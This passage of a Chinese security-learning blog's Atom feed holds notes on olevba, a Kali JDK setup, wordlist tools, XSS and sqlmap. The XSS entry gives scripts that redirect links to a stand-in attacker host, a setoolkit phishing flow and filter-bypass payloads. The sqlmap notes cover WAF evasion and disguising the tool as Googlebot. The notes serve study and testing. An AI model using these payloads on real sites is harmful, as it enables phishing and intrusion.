    <content type="html"><![CDATA[<ul><li>github : <a href="https://github.com/decalage2/oletools">decalage2/oletools</a></li></ul><h2 id="olevba"><a href="#olevba" class="headerlink" title="olevba"></a>olevba</h2><p><strong>文档链接：<a href="https://github.com/decalage2/oletools/wiki/olevba">olevba</a></strong></p><ul><li>扫描文件，其中会显示出宏源码</li></ul><pre class="line-numbers language-bash"><code class="language-bash">olevba <span class="token variable">$filepath</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>不分析，只显示宏源码</li></ul><pre class="line-numbers language-bash"><code class="language-bash">olevba -c/--code <span class="token variable">$filepath</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;github : &lt;a href=&quot;https://github.com/decalage2/oletools&quot;&gt;decalage2/oletools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;olevba&quot;&gt;&lt;a href=&quot;#olevba&quot; class=</summary>
      
    
    
    
    
    <category term="宏病毒" scheme="https://guapizhu.github.io/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"/>
    
    <category term="病毒分析" scheme="https://guapizhu.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>kali2020安装jdk</title>
    <link href="https://guapizhu.github.io/2020/09/18/kali2020-an-zhuang-jdk/"/>
    <id>https://guapizhu.github.io/2020/09/18/kali2020-an-zhuang-jdk/</id>
    <published>2020-09-18T03:00:00.000Z</published>
    <updated>2020-09-18T03:02:07.245Z</updated>
    
    <content type="html"><![CDATA[<ul><li>下载那个tar包，不要deb，这个deb装在哪我都不知道</li><li>配置/etc/profile，追加，<strong>以下所有具体内容视具体情况定</strong></li></ul><pre class="line-numbers language-bash"><code class="language-bash">JAVA_HOME<span class="token operator">=</span>/home/megrez/myEnvir/jdk-14.0.1/CLASSPATH<span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib.tools.jarPATH<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$PATH</span><span class="token function">export</span> JAVA_HOME CLASSPATH PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>配置～/.bashrc</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/home/megrez/myEnvir/jdk-14.0.1/<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;JAVA_HOME&amp;#125;/lib</span><span class="token function">export</span> PATH<span class="token operator">=</span>$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;JAVA_HOME&amp;#125;/bin:$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>执行 source ~/.bashrc</li><li>执行以下代码</li></ul><pre class="line-numbers language-bash"><code class="language-bash">update-alternatives --install /usr/bin/java java /home/megrez/myEnvir/jdk-14.0.1/bin/java 1update-alternatives --install /usr/bin/javac javac /home/megrez/myEnvir/jdk-14.0.1/bin/javac 1update-alternatives --set java /home/megrez/myEnvir/jdk-14.0.1/bin/javaupdate-alternatives --set javac /home/megrez/myEnvir/jdk-14.0.1/bin/javac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>完成</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;下载那个tar包，不要deb，这个deb装在哪我都不知道&lt;/li&gt;
&lt;li&gt;配置/etc/profile，追加，&lt;strong&gt;以下所有具体内容视具体情况定&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;line-numbers languag</summary>
      
    
    
    
    
    <category term="环境安装" scheme="https://guapizhu.github.io/tags/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>字典工具</title>
    <link href="https://guapizhu.github.io/2020/09/18/web-an-quan-ru-men/zi-dian-gong-ju/"/>
    <id>https://guapizhu.github.io/2020/09/18/web-an-quan-ru-men/zi-dian-gong-ju/</id>
    <published>2020-09-18T03:00:00.000Z</published>
    <updated>2020-09-18T03:00:28.864Z</updated>
    
    <content type="html"><![CDATA[<ul><li>HTTP basic 认证<br>采用base64编码明文传输</li><li>cupp<br>制作字典，简单且强大。</li><li>pydictor<br>制作字典，提供大量特性。</li><li>dymerge<br>字典合并</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;HTTP basic 认证&lt;br&gt;采用base64编码明文传输&lt;/li&gt;
&lt;li&gt;cupp&lt;br&gt;制作字典，简单且强大。&lt;/li&gt;
&lt;li&gt;pydictor&lt;br&gt;制作字典，提供大量特性。&lt;/li&gt;
&lt;li&gt;dymerge&lt;br&gt;字典合并&lt;/li&gt;
&lt;/ul&gt;
</summary>
      
    
    
    
    
    <category term="web安全" scheme="https://guapizhu.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="字典" scheme="https://guapizhu.github.io/tags/%E5%AD%97%E5%85%B8/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="https://guapizhu.github.io/2020/09/15/xss/"/>
    <id>https://guapizhu.github.io/2020/09/15/xss/</id>
    <published>2020-09-15T10:20:00.000Z</published>
    <updated>2020-09-15T10:21:19.308Z</updated>
    
    <content type="html"><![CDATA[<ul><li>xss靶场</li></ul><blockquote><p><a href="http://xss-quiz.int21h.jp/">XSS Challenges</a></p></blockquote><ul><li>beef<blockquote><p>xss修改网页链接至恶意URL，利用beef渗透。<br><a href="http://www.vuln.cn/6966">浏览器利用框架BeEF</a></p></blockquote></li></ul><p>附，修改超链接网址JS代码：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>  window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> link<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>link<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        link<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://attacker-site.com/"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>setookit</li></ul><blockquote><p>利用setookit克隆网站，再利用原来网站的存储型xss跳转至我们克隆的网站，输入关键信息后再跳回原页面</p></blockquote><p>附，js跳转代码：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://attacker-site.com/"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="xss利用方式"><a href="#xss利用方式" class="headerlink" title="xss利用方式"></a>xss利用方式</h2><ul><li><p>onmouseover</p><blockquote><p> &lt;element onmouseover=”myScript”&gt;<br> 只要是元素，都可以写这玩意儿。</p></blockquote><ul><li>&lt;svg onload=myscript&gt;<blockquote><p>查资料暂时之发现说利用svg图片上传利用xss。</p></blockquote></li><li>javascript伪协议<blockquote><p>可执行多条语句，一般用在a标签的herf中。<br><strong>javascript 任意字母间可以空格隔开，可以用于关键字绕过</strong><br>如：javas cript:alert(1)</p></blockquote></li></ul></li><li><p>编码绕过过滤的关键字</p></li></ul><blockquote><p>js函数atob,btoa配合eval。</p></blockquote><ul><li>document.write()</li></ul><blockquote><p>document.write()可以在页面载入过程中，加入新的页面内容。<br>并且会把hex,unicode转义，如document.write(“\x3c”)会输出&lt;，document.write(“\u0040”)会输出&lt;<br>可以用来绕尖括号，引号的转义</p></blockquote><ul><li><p>&lt;video src=1 onerror=alert(1)&gt;</p></li><li><p>在IE中，``可以闭合”，用于绕过</p></li><li><p>在低版本IE中，style属性可以使用payload：background-color:#f00;background:url(“javascript:alert(document.domain);</p></li><li><p>在IE中，css支持，expression执行js代码</p></li></ul><h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><ul><li>使js代码不能读取cookie,使用setcookie的secure参数。</li><li>防御xss的函数</li></ul><blockquote><ol><li>htmlspecialchars()    将一些字符实体化</li><li>htmlentities()        将一些字符实体化（这个函数非常有用）</li><li>strip_tags()    剥去字符串中HTML，XML，PHP的标签</li><li>也可以网上搜索XSS_Filter</li></ol></blockquote><ul><li>kali自带的xsspayload字典路径为：/usr/share/wordlists/wfuzz/Injections/XSS.txt</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;xss靶场&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;XSS Challenges&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;beef&lt;blockquote</summary>
      
    
    
    
    
    <category term="web安全" scheme="https://guapizhu.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="xss" scheme="https://guapizhu.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="https://guapizhu.github.io/2020/09/14/web-an-quan-ru-men/sqlmap/"/>
    <id>https://guapizhu.github.io/2020/09/14/web-an-quan-ru-men/sqlmap/</id>
    <published>2020-09-14T03:00:00.000Z</published>
    <updated>2020-09-14T02:39:56.879Z</updated>
    
    <content type="html"><![CDATA[<ul><li>小知识</li></ul><blockquote><ol><li>cookie注入检测level必须到达到2以上</li><li>–cookie=”$cookie”    指定使用的cookie</li><li>HTTP主机头注入检测level必须达到5</li><li>Refer头注入检测level要[3,5]</li><li>-hh 详细的帮助信息</li><li>–delay 0.5      延迟包与包的间距0.5s</li><li>–timeout 10.5    超时时间，若10.5s没响应，就不再等待，默认30s。</li><li>–retries 5 重试次数，默认3次</li><li>–randomize $参数名称  对参数的值进行随机化</li><li>–skip-urlencode     不进行URL编码。注：在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。    </li><li>–ignore-401  忽略http认证直接探测。注： sqlmap遇到401默认会停止探测</li><li>URI注入需要指定参数，sqlmap不会自动化探测，参数指定方法：在参数后加“*”，如：”URL?id=1*&amp;name=qqq*”</li></ol></blockquote><ul><li><p>小功能</p><blockquote><ol><li>指定DBMS，加快探测，格式：–dbms $数据库名称 [$版本号] ，如：–dbms mysql 5.0</li><li>指定OS，加快探测，如：–os windows ， –os linux</li><li>关闭负载转换机制，在目标mysql版本老旧时需要用到，参数：–no-cast</li></ol></blockquote><ul><li><p>sqlmap利用sql注入获取信息参数</p><blockquote><p> -f –fingerprint 指纹信息<br>  –banner banner信息<br> –dbs 所有数据库名<br> –users 所有用户名<br> –current-db     当前数据库名<br> –current-user      当前用户名</p></blockquote></li><li><p>sqlmap探测URL</p><blockquote><p>-u –url ：<strong>对单一url进行探测</strong>，URL格式：http(s): //targeturl[:port]/[…]，如：python  sqlmap.py -u “http: //<a href="http://www.target/">www.target</a>. co/vuln.php?id=1” –banner</p><p><strong>sqlmap从文件中读取数据探测多个URL</strong>：<br>1、-l 从Burpsuite proxy ，WebScarab proxy中读取http请求日志文件<br>2、-x 从 sitemap.xml站点地图文件中读取目标探测。<br>3、-m 从多行文本格式文件读取多个目标,对多个目标进行探测。<br><strong>4、-r 从文本文件中读取Http请求作为Sq注入探测的目标。</strong><br>5、-c 从配置文件 sqlmap conf中读取目标探测。</p><p><strong>利用google语法找站探测</strong>，如：python sqlmap.py -g “inurl: &quot;.php?id=1””</p></blockquote></li></ul></li></ul><ul><li>sqlmap直连数据库</li></ul><blockquote><p>1.<strong>服务型数据库</strong>(前提知道数据库用户名和密码)  ：<br>DBMS: //USER: PASSWORDODBMS IP: DBMS_PORT/DATABASE_NAME(MySQL, Orace  Server, Microsoft SQL Server,PostgreSQL,etc.)<br>如：python sqlmap.py -d “mysql://admin:admin@192. 168.21.17: 3306/testdb” -f –banner –dbs –users<br>2.<strong>文件型数据库</strong>(前提知道数据库绝对路径) ：<br>DBMS: //DATABASE FILEPATH(SQLite, Microsoft Access, Firebird, etc.）</p></blockquote><ul><li><p>sqlmap使用POST探测</p><blockquote><p>如：python sqlmap.py -u “$url” –data “$POST” –banner</p></blockquote></li><li><p>sqlmap指定分割符</p></li></ul><blockquote><p>sqlmap只能识别默认的分割符&amp;，若要指定分割符，使用参数 –param,如：python sqlmap.py -u “$URL” –data=”query=foobar;id=1” –param-del=”;” –banner</p></blockquote><ul><li>sqlmap指定测试参数</li></ul><blockquote><p>指定需要探测的参数：-p  ，如：(?page=1&amp;id=2 -p “page,id”)<br>忽略需要探测的参数：–skip ，如： –skip “page,id”</p></blockquote><ul><li>sqlmap 修改默认User-Agent</li></ul><blockquote><p>1.用自带参数修改<br>默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx (<a href="http://sqlmap.org/">http://sqlmap.org</a>)<br> 可以使用–user-anget参数来修改，同时也可以使–random-agnet参数来随机的从./txt/user-agents.txt中获取。<br><strong>当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</strong><br> 2.修改源代码<br>打开sql目录下的\lib\core\option.py<br>翻到def _defaultHTTPUserAgent()函数，1231行，找到函数末尾<br>把<br> return “%s (%s)” % (VERSION_STRING, SITE)<br> 修改为：<br> return “Googlebot/2.1 (+<a href="http://www.google.com/bot.html)%E2%80%9D">http://www.google.com/bot.html)”</a><br><strong>推选使用第二种方法</strong>，一次修改终身受益，不用每次添加参数修改！</p></blockquote><ul><li>sqlmap设置HTTP协议认证参数</li></ul><blockquote><p>Sqlmap中设置HTTP协议认证的参数：–auth-type和–auth-cred<br>其中-auth-type支持Basic、Digest、NTLM<br>    –auth-cred认证语法为：username:password<br>如：python sqlmap.py -u “http:/url/arit.php?id=1” –auth-type Basic –auth-cred “testuser.testpass”</p></blockquote><p>图示：<br><img src="data:image/png;base64,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" alt="avatar"></p><ul><li><p>sqlmap设置代理及tor代理</p><blockquote><p>略</p></blockquote></li><li><p>sqlmap过滤burpsuit日志文件中的url进行扫描</p></li></ul><blockquote><p>因为日志文件中会有很多http包，过滤会大大提升效率<br>如（–scope python正则表达式）：<br>python sqlmap.py -I burp.log –scope=”(www)?.targett.(comlnetlorg)”</p></blockquote><ul><li><strong>sqlmap 设置安全模式</strong></li></ul><blockquote><p>避免在多次请求失败后销毁会话<br>有时,如果执行了一定数量的不成功请求,则在此期间的web应用程序或检查技术会销毁会话。这可能发生在 sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出,因此可能会向应用程序会  话管理或检查技术发出信号。<br> –safe-url, –safe-post, –safe-req –safe-freq<br> 通过这种方式, sqlmap将访问每个预定义数量的请求,而不对某个安全URL执行任何类型的注入。</p></blockquote><ul><li>sqlmap提升探测速度</li></ul><blockquote><ol><li>设置持久连接，即http报文中的connection：keep-alive，参数：–keep-alive</li><li>不接受http报文中的body，常用于盲注，原理是使用http的head方法，参数：–null-connection</li><li>多线程，默认1线程，最多10线程，参数：–thread $thread_number</li><li>预测输出，这个参数主要是根据返回结果与sqlmap自带的一个表（/sqlmap/common-outputs.txt）里面的内容进行比对，缩小范围并使用不同的payloads进行更有针对性的检测，从而提高效率，参数：–predict-output</li><li><strong>开启所有性能优化参数</strong>，参数：-o</li></ol></blockquote><ul><li>sqlmap的tamper脚本：绕WAF用</li></ul><blockquote><p>设置tamper脚本，可以设置多个脚本如：–tamper “x1.py,x2.py”<br>sqlmap的tamper脚本目录为/user/share/sqlmap/tamper</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;小知识&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;cookie注入检测level必须到达到2以上&lt;/li&gt;
&lt;li&gt;–cookie=”$cookie”    指定使用的cookie&lt;/li&gt;
&lt;li&gt;HTTP主机头注入检测level必须达</summary>
      
    
    
    
    
    <category term="web安全" scheme="https://guapizhu.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="sqlmap" scheme="https://guapizhu.github.io/tags/sqlmap/"/>
    
    <category term="学习记录" scheme="https://guapizhu.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>sql注入记录</title>
    <link href="https://guapizhu.github.io/2020/09/12/web-an-quan-ru-men/sql-zhu-ru-ji-lu/"/>
    <id>https://guapizhu.github.io/2020/09/12/web-an-quan-ru-men/sql-zhu-ru-ji-lu/</id>
    <published>2020-09-12T07:25:00.000Z</published>
    <updated>2020-09-14T01:06:36.889Z</updated>
    
